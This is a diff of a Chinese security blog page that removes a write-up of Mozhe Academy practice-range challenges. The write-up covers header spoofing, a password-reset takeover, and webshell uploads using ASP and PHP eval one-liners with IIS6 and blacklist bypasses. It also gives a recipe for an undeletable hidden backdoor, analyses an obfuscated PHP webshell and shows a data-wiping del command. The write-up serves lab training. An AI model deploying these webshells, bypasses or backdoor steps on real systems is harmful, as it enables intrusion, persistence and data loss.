@@ -6,20 +6,15 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>墨者学院在线靶场writeup | SpongeB0B&#39;s Blog</title>
+  <title>Tag: 编程 | SpongeB0B&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="最近发现墨者学院的一些在线靶场很不错，大部分也都免费，看了一下，很多靶场也是别的平台和比赛没有，对于学习者来说难度逐步提高，阶梯很合理，对新手特别友好，所以就注册了一下玩一下。官网地址，对于web安全，我也是萌新，会嘤嘤嘤的那种（都说越菜越萌），那就从入门题开始，一步一步来。由于七牛云还没实名认证，编辑器不带图床，所以简单就不上图了，就写一下解题步骤。">
-<meta name="keywords" content="write up,注入,脚本,墨者学院,在线靶场,burpsuite,web安全,代码审计,取证分析,webshell,上传漏洞,绕过,木马">
-<meta property="og:type" content="article">
-<meta property="og:title" content="墨者学院在线靶场writeup">
-<meta property="og:url" content="http://yoursite.com/2018/08/16/墨者学院在线靶场writeup/index.html">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="SpongeB0B&#39;s Blog">
+<meta property="og:url" content="http://yoursite.com/tags/编程/index.html">
 <meta property="og:site_name" content="SpongeB0B&#39;s Blog">
-<meta property="og:description" content="最近发现墨者学院的一些在线靶场很不错，大部分也都免费，看了一下，很多靶场也是别的平台和比赛没有，对于学习者来说难度逐步提高，阶梯很合理，对新手特别友好，所以就注册了一下玩一下。官网地址，对于web安全，我也是萌新，会嘤嘤嘤的那种（都说越菜越萌），那就从入门题开始，一步一步来。由于七牛云还没实名认证，编辑器不带图床，所以简单就不上图了，就写一下解题步骤。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-08-22T09:44:25.955Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="墨者学院在线靶场writeup">
-<meta name="twitter:description" content="最近发现墨者学院的一些在线靶场很不错，大部分也都免费，看了一下，很多靶场也是别的平台和比赛没有，对于学习者来说难度逐步提高，阶梯很合理，对新手特别友好，所以就注册了一下玩一下。官网地址，对于web安全，我也是萌新，会嘤嘤嘤的那种（都说越菜越萌），那就从入门题开始，一步一步来。由于七牛云还没实名认证，编辑器不带图床，所以简单就不上图了，就写一下解题步骤。">
+<meta name="twitter:title" content="SpongeB0B&#39;s Blog">
   
     <link rel="alternative" href="/atom.xml" title="SpongeB0B&#39;s Blog" type="application/atom+xml">
   
@@ -178,308 +173,68 @@ var _hmt = _hmt || [];
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-墨者学院在线靶场writeup" class="article article-type-post " itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
+            
   
-    <h1 class="article-title" itemprop="name">
-      墨者学院在线靶场writeup
+  
+    
+    
+      
+      
+      <section class="archives-wrap">
+        <div class="archive-year-wrap">
+          <a href="/archives/2018" class="archive-year">2018</a>
+        </div>
+        <div class="archives">
+    
+    <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+      	<div class="article-meta">
+	      	<a href="/2018/09/18/学习恶意软件分析应该掌握哪些语言/" class="archive-article-date">
+  	<time datetime="2018-09-18T08:11:08.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-09-18</time>
+</a>
+        </div>
+    	 
+  
+    <h1 itemprop="name">
+      <a class="archive-article-title" href="/2018/09/18/学习恶意软件分析应该掌握哪些语言/">学习恶意软件分析应该掌握哪些语言</a>
     </h1>
   
 
-        
-        <a href="/2018/08/16/墨者学院在线靶场writeup/" class="archive-article-date">
-  	<time datetime="2018-08-16T08:29:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-16</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=573583328&auto=1&height=66"></iframe><br>最近发现墨者学院的一些在线靶场很不错，大部分也都免费，看了一下，很多靶场也是别的平台和比赛没有，对于学习者来说难度逐步提高，阶梯很合理，对新手特别友好，所以就注册了一下玩一下。<a href="https://www.mozhe.cn" target="_blank" rel="noopener">官网地址</a>，对于web安全，我也是萌新，会嘤嘤嘤的那种（都说越菜越萌），那就从入门题开始，一步一步来。<br><code>由于七牛云还没实名认证，编辑器不带图床，所以简单就不上图了，就写一下解题步骤。</code></p>
-<a id="more"></a>
-<h1 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h1><h3 id="WEB页面源代码查看"><a href="#WEB页面源代码查看" class="headerlink" title="WEB页面源代码查看"></a>WEB页面源代码查看</h3><p>打开是一个HTML页面，鼠标右键被禁用，直接<code>F12</code>，控制台点<code>Elements</code>看源代码,就发现key了</p>
-<h3 id="服务器返回数据查看"><a href="#服务器返回数据查看" class="headerlink" title="服务器返回数据查看"></a>服务器返回数据查看</h3><p><code>F12</code>打开控制台，点击<code>network</code>，点击<code>ip</code>，点<code>heards</code>,然后展开<code>response</code>就可以看到key</p>
-<h3 id="浏览器信息伪造"><a href="#浏览器信息伪造" class="headerlink" title="浏览器信息伪造"></a>浏览器信息伪造</h3><p>题目提示<code>从微信6.0开始，其内嵌的浏览器在User-Agent字符串中增加了NetType,根据页面提示,抓包分析除了判断浏览器类型还判断了微信特有的NetType</code><br>这里可以打开目标网页，发现是一个微信文章，然后使用神器<code>burpsuite</code>抓包(需要在浏览器设置代理，具体设置方法百度，<code>127.0.0.1</code>,端口<code>8080</code>)，先在<code>proxy-&gt;intercept</code>中，点击<code>intercept is off</code>(变成On表示在抓包),点击微信链接，然后在Raw中看到抓到的数据包，然后修改<code>User-Agent</code>为(<code>Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/2G Language/zh_CN</code>),然后鼠标右键<code>Send To Repeater</code>,看见<code>Repeater</code>变成黄色，然后点击<code>Repeater</code>进入重放功能模块，点击<code>GO</code>,右边返回结果里有key<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">简述：抓包--&gt;改User-Agent--&gt;重放--&gt;返回key</span><br></pre></td></tr></table></figure></p>
-<h3 id="登录密码重置漏洞分析溯源"><a href="#登录密码重置漏洞分析溯源" class="headerlink" title="登录密码重置漏洞分析溯源"></a>登录密码重置漏洞分析溯源</h3><p>同上抓包，chrome设置代理很麻烦，推荐一个插件很方便简洁(falcon proxy)<br>打开目标地址看到一个<code>关于获取某系统帐号权限的说明</code>xxx朝阳群众举报啥的，重置<code>17101304128</code>的密码<br>点击进入重置密码页面，看到下面写你注册的手机号码为<code>18868345809</code>,输入下面给的那个账号和新密码和验证码，点击获取验证码页面会弹出验证码,然后抓包，点击重置密码，把号码换成目标号码，然后重放，返回结果显示<code>{&quot;errorcode&quot;:0,&quot;message&quot;:&quot;&quot;:&quot;\u91cd\u7f6e\u6210\u529f\uff0c\u60a8\u7684key\uff1amozhe1b7a69720b37302d51b4b790760&quot;,&quot;data&quot;:[]}</code>,一看是Unicode编码，拿去在线解一下，得到<code>:&quot;&quot;:&quot;重置成功，您的key：mozhe1b7a69720b37302d51b4b790760</code>,拿到key<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">简述：输入注册的手机号码等信息--&gt;抓包改成目标号码--&gt;重放--&gt;结果Unicode解码--&gt;key</span><br></pre></td></tr></table></figure></p>
-<h3 id="热点评论刷分漏洞分析溯源"><a href="#热点评论刷分漏洞分析溯源" class="headerlink" title="热点评论刷分漏洞分析溯源"></a>热点评论刷分漏洞分析溯源</h3><p><code>X-Forwarded-For</code>:简称<code>XFF头</code>，它<code>代表客户端</code>，也就是HTTP的<code>请求端真实的IP</code>，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。<br>打开目标发现要求对<code>zhangyu</code>这个用户进行点赞到500个以上进入热评，试着点赞，发现第二次点会显示你已经点过赞，但是我们并没有登录，只要在数据包里添加<code>X-Forwarded-For</code>,随便输入ip，又可以点赞，思路肯定是爆破，<code>send to intruder</code>,然后先点<code>clear</code>，选中<code>ip</code>最后一位，点击<code>add</code>,然后<code>payloads</code>里选择<code>payload type</code>为<code>number</code>,在下面<code>form</code>里填<code>1</code>，<code>to</code>填<code>500</code>，<code>Step</code>填<code>1</code>即可，点击<code>start attack</code>，完成爆破，刷新页面拿到key<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">简述：输入X-Forwarded-For: 10.10.10.1（ip随便输）--&gt;爆破--&gt;拿到key</span><br></pre></td></tr></table></figure></p>
-<h3 id="投票常见漏洞分析溯源"><a href="#投票常见漏洞分析溯源" class="headerlink" title="投票常见漏洞分析溯源"></a>投票常见漏洞分析溯源</h3><p>这个就是<code>浏览器信息伪造</code>+<code>热点评论刷分漏洞分析溯源</code>的结合。<br>使用BurpSuite抓包，修改User-Agent为微信用户<br>X-Forwarded-fors地址里设置随机的一段IP，使用intruder<br>刷完了刷新浏览器取得KEY</p>
-<h3 id="来源页伪造"><a href="#来源页伪造" class="headerlink" title="来源页伪造"></a>来源页伪造</h3><p>打开页面点击发现弹窗要求从<code>google.com</code>访问，根据题目提示伪造<code>referer</code>，burpsuite抓包将<code>referer</code>改成<code>http://www.google.com</code>,<strong>注</strong>：一定要加www，<code>send to response</code>,拿到key</p>
-<h3 id="HTTP动作练习"><a href="#HTTP动作练习" class="headerlink" title="HTTP动作练习"></a>HTTP动作练习</h3><p>打开页面根据提示抓包发现<code>content</code>里有一大串base64编码的数据用的是<code>GET</code>方式<br>Get是所有web请求默认的方法，get请求将所有表单数据打成包，附到请求的url后面，浏览器将其作为url放在HTTP报头中，从浏览器缓存中可以查到请求串内容，但因把要传递的数据附加在url后面，传递数据量受限。<br>所以要改成<code>post</code>方式提交，如果是<code>Firefox浏览器</code>可以使用<code>hackbar</code>这个插件非常方便。<br><code>burpsuite</code>也可以，右键<code>change request metho</code>。<br>如果是手动改包，出来讲<code>GET</code>改成<code>POST</code><br><strong>注</strong>：把<code>content=xxxx</code>剪切到最下面（必须和请求行空一行），然后把头部改成<code>POST /info.php HTTP/1.1</code>，还需要添加<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 9966</span><br></pre></td></tr></table></figure></p>
-<h3 id="IP地址伪造-第1题"><a href="#IP地址伪造-第1题" class="headerlink" title="IP地址伪造(第1题)"></a>IP地址伪造(第1题)</h3><p>尝试常见弱口令，账号密码为<code>admin</code>时，返回提示只允许在服务器登录，说明账号密码正确，抓包添加<code>X-Forwarded-For: 127.0.0.1</code>为，成功拿到key</p>
-<h3 id="IP地址伪造-第2题"><a href="#IP地址伪造-第2题" class="headerlink" title="IP地址伪造(第2题)"></a>IP地址伪造(第2题)</h3><p>同上，弱口令，账号密码<code>test</code>，提示要求<code>台湾Ip</code>,<code>google</code>了一个台湾Ip<code>59.125.39.5</code>,所以抓包在请求带上<code>X-Forwarded-For: 59.125.39.5</code>时，<code>Forward</code>成功拿到key</p>
-<h3 id="远程电子数据取证-服务器分析-第1题"><a href="#远程电子数据取证-服务器分析-第1题" class="headerlink" title="远程电子数据取证-服务器分析(第1题)"></a>远程电子数据取证-服务器分析(第1题)</h3><p>不太建议使用windows自带的<code>远程桌面管理</code>，因为要修改防火墙组策略什么的很麻烦，可以用第三方的软件，分享一个小工具，功能很nice，只有几M，很方便<a href="https://pan.baidu.com/s/1rpiE4wVGRE6qhPTj7hDAcg" target="_blank" rel="noopener">远程桌面连接器</a><br>连接远程主机，工具–&gt;文件夹选项–&gt;查看–&gt;显示所有文件和文件夹–&gt;确定–&gt;搜索<code>Recycler</code>–&gt;打开搜索结果的文件夹和key_xxx.txt–&gt;拿到key</p>
-<h3 id="远程电子数据取证-服务器分析-第2题"><a href="#远程电子数据取证-服务器分析-第2题" class="headerlink" title="远程电子数据取证-服务器分析(第2题)"></a>远程电子数据取证-服务器分析(第2题)</h3><p>在远程主机上，开始–&gt;管理工具–&gt;事件查看器–&gt;系统–&gt;选择administrator用户操作的事件（ID：1074）–&gt;可以看到开机关机和注释–&gt;注释中拿到key</p>
-<h3 id="远程电子数据取证-服务器分析-第3题"><a href="#远程电子数据取证-服务器分析-第3题" class="headerlink" title="远程电子数据取证-服务器分析(第3题)"></a>远程电子数据取证-服务器分析(第3题)</h3><p>打开<code>C:\\WINDOWS\\temp</code>文件夹有个key_xxx.txt，打开拿到key</p>
-<h3 id="远程电子数据取证-服务器分析-第4题"><a href="#远程电子数据取证-服务器分析-第4题" class="headerlink" title="远程电子数据取证-服务器分析(第4题)"></a>远程电子数据取证-服务器分析(第4题)</h3><p>打开C盘根目录，打开<code>txtkey_1.txt</code>，拿到key</p>
-<h3 id="远程电子数据取证-服务器分析-第5题"><a href="#远程电子数据取证-服务器分析-第5题" class="headerlink" title="远程电子数据取证-服务器分析(第5题)"></a>远程电子数据取证-服务器分析(第5题)</h3><p>直接搜索key,在<code>C:\\WINDOWS</code>下打开拿到key</p>
-<h3 id="远程电子数据取证-服务器分析-第6题"><a href="#远程电子数据取证-服务器分析-第6题" class="headerlink" title="远程电子数据取证-服务器分析(第6题)"></a>远程电子数据取证-服务器分析(第6题)</h3><p>打开<code>C:\\Documents and Settings\\Administrator\\UserData\\DZAGF6NH</code>,打开key_xxx.txt拿到key</p>
-<h3 id="远程电子数据取证-服务器分析-第7题"><a href="#远程电子数据取证-服务器分析-第7题" class="headerlink" title="远程电子数据取证-服务器分析(第7题)"></a>远程电子数据取证-服务器分析(第7题)</h3><p>搜索<code>key</code>,发现一个<code>key_2017.txt</code>的快捷方式，查看属性，发现<code>key_2017.txt</code>在C盘根目录，<code>工具</code>–&gt;<code>查看</code>–&gt;<code>显示所有文件和文件夹</code>+<code>（取消勾选）隐藏受保护的操作系统文件</code>–&gt;打开<code>key_2017.txt</code>–&gt;拿到key</p>
-<h3 id="远程电子数据取证-木马分析-第1题"><a href="#远程电子数据取证-木马分析-第1题" class="headerlink" title="远程电子数据取证-木马分析(第1题)"></a>远程电子数据取证-木马分析(第1题)</h3><p>连接上服务器，先搜索<code>SEO</code>找到seo文件夹路径，在<code>C:\\Inetpub\\wwwroot\\seo</code>，打开这个路径并没有<code>seo</code>这个文件夹，在<code>工具-&gt;文件夹选项中显示隐藏文件</code><strong>无效</strong>，根据提示和百度得知是<code>驱动级文件隐藏</code>,特征为系统目录下存在如下文件:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\\WINDOWS\\xlkfs.dat</span><br><span class="line">C:\\WINDOWS\\xlkfs.dll</span><br><span class="line">C:\\WINDOWS\\xlkfs.ini</span><br><span class="line">C:\\WINDOWS\\system32\\drivers\\xlkfs.sys</span><br></pre></td></tr></table></figure></p>
-<p>查询服务状态：<br><code>sc qc xlkfs</code><br>停止服务:<br><code>net stop xlkfs</code><br>发现<code>seo</code>文件夹出现了，打开<code>key_shell.asp</code>，拿到key<br><a href="https://www.waitalone.cn/hack-seo-drive.html" target="_blank" rel="noopener">参考文章</a></p>
-<h3 id="远程电子数据取证-木马分析-第2题"><a href="#远程电子数据取证-木马分析-第2题" class="headerlink" title="远程电子数据取证-木马分析(第2题)"></a>远程电子数据取证-木马分析(第2题)</h3><p><strong>原理：</strong></p>
-<h6 id="利用保留字隐藏"><a href="#利用保留字隐藏" class="headerlink" title="利用保留字隐藏"></a>利用保留字隐藏</h6><p>windows系统有些保留文件夹名，windows系统不允许用这些名字命名文件夹，如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aux|prn|con|nul|com1|com2|com3|com4|com5|com6|com7|com8|com9|lpt1|lpt2|lpt3|lpt4|lpt5|lpt6|lpt7|lpt8|lpt</span><br></pre></td></tr></table></figure></p>
-<p>我们可以在cmd下这么做：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;%eval request(&quot;joker&quot;)%&gt;&quot; &gt;&gt; d:\test.asp</span><br><span class="line">copy d:\test.asp .\d:\aux.asp</span><br></pre></td></tr></table></figure></p>
-<p>这样就可以创建一个无法删除的文件了，这个文件在图形界面下是无法删除的，甚至<code>del d:\aux.asp</code>也无法删除<br><strong>解题步骤:</strong><br>先把文件夹选项里的隐藏文件打开,搜索key,发现<code>COM6.key_shell.asp</code>,这就是保留字文件，我们需要读取文件的内容，得到key，双击文件，提示：<code>找不到文件</code>，进过一番百度：<br><code>type \\.\C:\Inetpub\wwwroot\COM6.key_shell.asp</code><br>拿到key<br><strong>\.\ 的用法:</strong><br><del><code>rd /s /q \\.\h:\autorun.inf\</code>这条命令为什么能删除包含畸形文件夹在内的所有文件夹？</del><br><code>\\.\</code>理解为<code>\\127.0.0.1\</code><br>UNC的一个本地化特例。<br><code>?\</code>可以理解成遍历，?是通配符，表示匹配0个或1个任意字符。<br><code>.\</code>代表本地节点，在概念上来有点像磁盘根目录，也可以说成是计算机根目录<br>所以<code>dir \\.\C:\</code>是可以被命令行解释器识别的，更可以跨盘符的来使用绝对路径引用，例如:<br><code>F:\&gt;\\.\C:\windows\system32\cmd.exe</code><br>使用UNC路径不会捡测路径中的保留字设备名称等，因此删除包含畸形文件夹在内的所有文件夹<br><code>del /q /f /a \\?\%1</code>可以删除所有文件<br>UNC路径的一个特例。UNC路径就是符合 <code>\\servername\sharename</code>格式，其中 <code>servername</code>是服务器名，<code>sharename</code>是共享资源的名称。?是统配符，表示匹配0个或1个任意字符。使用UNC路径不会捡测路径中的保留字设备名称等，因此可以用这种方法来删除特殊文件或目录。<br><strong>注：</strong> 如果你想删除的文件夹中包含特殊路径，可能导致整个磁盘分区的数据全部被删除。因此，如果你还不能对这个命令了如指掌，不建议使用这样的命令。</p>
-<p><strong>扩展知识：</strong></p>
-<h6 id="利用clsid隐藏"><a href="#利用clsid隐藏" class="headerlink" title="利用clsid隐藏"></a>利用clsid隐藏</h6><p>windows中每一个程序都有一个clsid，创建一个文件夹，取名<code>x.{21ec2020-3aea-1069-A2dd-08002b30309d}</code>这时候打开这个文件夹就是控制面板了。<br>为了更隐蔽些我们可以结合windows保留字使用以下命令：<br><code>md \.d:com1.{21ec2020-3aea-1069-A2dd-08002b30309d}</code><br>这样生成的文件夹无法删除，无法修改,无法查看  </p>
-<h6 id="利用注册表隐藏"><a href="#利用注册表隐藏" class="headerlink" title="利用注册表隐藏"></a>利用注册表隐藏</h6><p>注册表路径：<br><code>HKEY_LOCAL_MACHINESoftwareMicrosoftWindowsCurrentVersionexplorer＼AdvancedFolderHiddenSHOWALL</code><br>在这个路径下有一个<code>CheckedValue</code>的键值，把他修改为0，如果没有<code>CheckValue</code>这个key直接创建一个，将他赋值为0，然后创建的隐藏文件就彻底隐藏了，即时在文件夹选项下把<code>显示所有文件</code>也不能显示了。<br>最后我们结合<code>保留字</code>和<code>clsid</code>两种方法生成一个后门。首先我们创建一个目录md<br> <code>\.d:com1.{21ec2020-3aea-1069-A2dd-08002b30309d}</code><br>接着<br><code>attrib -s -h -a -r x:RECYCLED&amp;&amp;copyx:RECYCLED</code><br><code>\.d:com1.{21ec2020-3aea-1069-A2dd-08002b30309d}</code><br>为了保险起见，我们在这个回收站丢点东西证明它是在运作的<br><code>echo execcode&gt;&gt;\.d:com1.{21ec2020-3aea-1069-A2dd-08002b30309d}RECYCLEDaux.asp</code><br>好了一个超级猥琐的后门诞生了，但，并不完美，或许还可以这么做<br><code>attrib \.d:com1.{21ec2020-3aea-1069-A2dd-08002b30309d}RECYCLEDaux.asp +h+s +r +d /s /d</code><br><code>cacls /E /G Everyone:N</code><br>一个基于<code>system桌面权限</code>以及<code>任何webshell</code>，以及Cmd下的都无法查看，修改，和Del的完美后门诞生了。</p>
-<h6 id="利用畸形目录"><a href="#利用畸形目录" class="headerlink" title="利用畸形目录"></a>利用畸形目录</h6><p>在<code>XP</code>系统可以使用<code>md xx..\</code>命令，带<code>.</code>的文件夹（亦称畸形目录），需要看的时候用运行命令打开。<br>但是在<code>WIN7</code>中这个方法失灵了，但是只要知道畸形目录的真实DOS（8.3格式）名称即可。如何查看真实名称？<br>用带<code>/x</code>参数的<code>dir</code>命令即可。<br>列如在F盘的<code>abc</code>文件夹下有个畸形目录<code>g..\</code>(显示为g.文件夹)，运行<code>dir /x f:\abc</code>找到<code>g.</code>的行可以看到畸形文件夹的真实<code>DOS</code>名称是<code>GE276~1</code>,然后打开<code>运行</code>输入<code>f:\abc\ge276~1</code>并回车，即可打开这个畸形目录。</p>
-<h3 id="远程电子数据取证-木马分析-第3题"><a href="#远程电子数据取证-木马分析-第3题" class="headerlink" title="远程电子数据取证-木马分析(第3题)"></a>远程电子数据取证-木马分析(第3题)</h3><p>就是利用<code>畸形目录</code>先搜索<code>888.</code>，找到真实<code>DOS名称</code>，为<code>888~1</code>，通过上述方法打开，就拿到key了</p>
-<h3 id="远程电子数据取证-木马分析-第4题"><a href="#远程电子数据取证-木马分析-第4题" class="headerlink" title="远程电子数据取证-木马分析(第4题)"></a>远程电子数据取证-木马分析(第4题)</h3><p>和第二题一样，先把文件夹选项里的隐藏文件打开,进入 <code>/windows/sysytem32LogFilesW3SVC1</code>目录查看日志，发现key文件(搜索key),然后<code>type \\.\C:\Inetpub\wwwroot\lpt6.key_shell.asp</code></p>
-<h3 id="内部文件上传系统漏洞分析溯源"><a href="#内部文件上传系统漏洞分析溯源" class="headerlink" title="内部文件上传系统漏洞分析溯源"></a>内部文件上传系统漏洞分析溯源</h3><p>先上传一张图片，看到url后面是<code>upload.asp</code>，所以构造一个asp一句话马，通过F12控制台中查看<code>response headers</code>，看到server是<code>Microsoft-IIS/6.0.</code>尝试了文件解析，发现服务器会自动改名，所以只能采用目录解析，具体利用方法：写好asp一句话<code>&lt;%eval request(&quot;pass&quot;)%&gt;</code>,将文件名改完<code>xxx.txt</code>或<code>xxx.jpg</code>等，然后开启<code>burpsuite</code>，点击上传，在数据包里将<code>upload</code>改成<code>xxx.asp</code>，forward一下，然后菜刀直接连接，在html目录下拿到key。  </p>
-<h6 id="IIS6-0解析漏洞利用方法"><a href="#IIS6-0解析漏洞利用方法" class="headerlink" title="IIS6.0解析漏洞利用方法:"></a>IIS6.0解析漏洞利用方法:</h6><p><strong>目录解析:</strong> 在网站建立文件夹的名称为<code>.asp</code>、<code>.asa</code>的文件夹，其目录内的任何扩展名的文件都被IIS当作asp文件来解析并执行。<br><strong>文件解析:</strong> <code>test.asp;.jpg</code>,上传名为“test.asp;.jpg”的文件，虽然该文件真正的后缀名是“.jpg”，但由于含有特殊符号“;”，仍会被IIS当做asp程序执行。除此之外<code>.asa</code>,<code>.cer</code>,<code>.cdx</code>都会被当做<code>.asp</code>执行。</p>
-<h3 id="WebShell文件上传漏洞分析溯源-第1题"><a href="#WebShell文件上传漏洞分析溯源-第1题" class="headerlink" title="WebShell文件上传漏洞分析溯源(第1题)"></a>WebShell文件上传漏洞分析溯源(第1题)</h3><p>上传图片显示<code>文件上传成功保存于：uploads/timg.jpg</code> ，换成<code>php</code>文件显示<code>此文件不允许上传</code><br>根据题目提示是黑名单绕过，将文件后缀改成<code>php3</code>|<code>php4</code>|<code>php5</code>(<code>php、php3、php4、php5、phtml、pht等都可以都可以被当做php文件执行</code>)即可成功上传。<br>然后菜刀连接(实际环境小心菜刀后门，被黑吃黑)，在菜刀中右键<code>添加</code>，然后在地址处输入：<code>http://219.153.49.228:47414/uploads/xxx.php5</code>然后输入密码，php文件中的代码为<code>&lt;?php @eval($_POST[AA])?&gt;</code>，密码则是<code>AA</code><br>最后返回<code>html</code>目录下看到一个key文件打开拿到key<br><a href="https://yehongning.github.io/2018/08/22/%E5%B8%B8%E8%A7%81%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%A4%A7%E5%85%A8/" target="_blank" rel="noopener">常见PHP一句话</a></p>
-<h3 id="WebShell文件上传漏洞分析溯源-第2题"><a href="#WebShell文件上传漏洞分析溯源-第2题" class="headerlink" title="WebShell文件上传漏洞分析溯源(第2题)"></a>WebShell文件上传漏洞分析溯源(第2题)</h3><p>上传php文件，看网站提示只能上传<code>.gif</code>|<code>.jpg</code>|<code>.png</code>格式的文件，查看源码发现有前端验证。<br>有两个思路绕过，一个是直接在浏览器禁止运行<code>JavaScript</code>，还可以就是先修改木马名，上传的时候抓包修改文件名。<br>这里直接在chrome网站设置将JavaScript禁止掉，然后上传回显<code>uploads/1.php</code>，菜刀连接，在<code>html</code>目录下找到key_xxx.php,直接打开没有任何显示，先清除一下缓存，再右键编辑打开拿到key。</p>
-<h3 id="PHP代码分析溯源-第1题"><a href="#PHP代码分析溯源-第1题" class="headerlink" title="PHP代码分析溯源(第1题)"></a>PHP代码分析溯源(第1题)</h3><p>打开网页，出现<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @$_++;$__=(<span class="string">"`"</span>^<span class="string">"?"</span>).(<span class="string">":"</span>^<span class="string">"&#125;"</span>).(<span class="string">"%"</span>^<span class="string">"`"</span>).(<span class="string">"&#123;"</span>^<span class="string">"/"</span>);$___=(<span class="string">"$"</span>^<span class="string">"&#123;"</span>).(<span class="string">"~"</span>^<span class="string">"."</span>).(<span class="string">"/"</span>^<span class="string">"`"</span>).(<span class="string">"-"</span>^<span class="string">"~"</span>).(<span class="string">"("</span>^<span class="string">"|"</span>);$&#123;$__&#125;[!$_]($&#123;$___&#125;[$_]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>因为电脑没装php环境，直接丢到在线IDE上跑一下，先按照分号换行的方式格式化一下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @$_++;</span><br><span class="line">$__=(<span class="string">"`"</span>^<span class="string">"?"</span>).(<span class="string">":"</span>^<span class="string">"&#125;"</span>).(<span class="string">"%"</span>^<span class="string">"`"</span>).(<span class="string">"&#123;"</span>^<span class="string">"/"</span>);</span><br><span class="line">$___=(<span class="string">"$"</span>^<span class="string">"&#123;"</span>).(<span class="string">"~"</span>^<span class="string">"."</span>).(<span class="string">"/"</span>^<span class="string">"`"</span>).(<span class="string">"-"</span>^<span class="string">"~"</span>).(<span class="string">"("</span>^<span class="string">"|"</span>);</span><br><span class="line">$&#123;$__&#125;[!$_]($&#123;$___&#125;[$_]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>运行第四行报错，根据php语法，知道<code>$_</code>,<code>$__</code>,<code>$___</code>是三个变量，php中^是异或，先把字符串转换成二进制进行互相异或，然后再吧结果转成字符串，先把第四行注释掉，然后<code>echo</code>三个变量<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @$_++;</span><br><span class="line">$__=(<span class="string">"`"</span>^<span class="string">"?"</span>).(<span class="string">":"</span>^<span class="string">"&#125;"</span>).(<span class="string">"%"</span>^<span class="string">"`"</span>).(<span class="string">"&#123;"</span>^<span class="string">"/"</span>);</span><br><span class="line">$___=(<span class="string">"$"</span>^<span class="string">"&#123;"</span>).(<span class="string">"~"</span>^<span class="string">"."</span>).(<span class="string">"/"</span>^<span class="string">"`"</span>).(<span class="string">"-"</span>^<span class="string">"~"</span>).(<span class="string">"("</span>^<span class="string">"|"</span>);</span><br><span class="line"><span class="comment">//$&#123;$__&#125;[!$_]($&#123;$___&#125;[$_]);</span></span><br><span class="line"><span class="keyword">echo</span> $_;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $__;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $___;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>输出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">_GET</span><br><span class="line">_POST</span><br></pre></td></tr></table></figure></p>
